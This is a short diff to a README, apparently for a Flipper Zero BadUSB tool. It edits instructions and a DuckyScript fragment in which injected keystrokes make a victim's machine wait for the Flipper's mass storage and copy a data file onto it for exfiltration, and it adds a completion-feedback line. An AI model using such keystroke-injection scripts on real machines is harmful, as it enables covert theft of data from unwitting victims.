@@ -74,7 +74,7 @@ When clicking down, FlipperZero will exits BasdUSB mode and mounts a mass storag
 
 The DuckyScript copies and runs a script that waits until this unit is available on the victims machine, and then copies the data to exfiltrate.
 
-Once the file was copied to FlipperZero, just click Back button to exit from *mass storage* mode and change to *basusb* mode. Another DuckyScript could be run again.
+Once the file was copied to FlipperZero, **click Back button** to exit from *mass storage* mode and change to *basusb* mode. Another DuckyScript could be run again. There is no way to know that the data was already copied into FlipperZero; it's worth to add a feedback to the end of copying process on the DuckyScript. 
 
 Here a DuckyScript example of the above described mechanism (bash).
 
@@ -98,6 +98,7 @@ STRINGLN until [ \`echo \$ms 2>/dev/null\` ];do gms;done;
 REM Copy the generated file on the Mass Storage
 STRINGLN cp my_data.txt \$ms
 
+REM Feedback on finish copying
 STRINGLN echo done :\)
 
 STRINGLN EOF
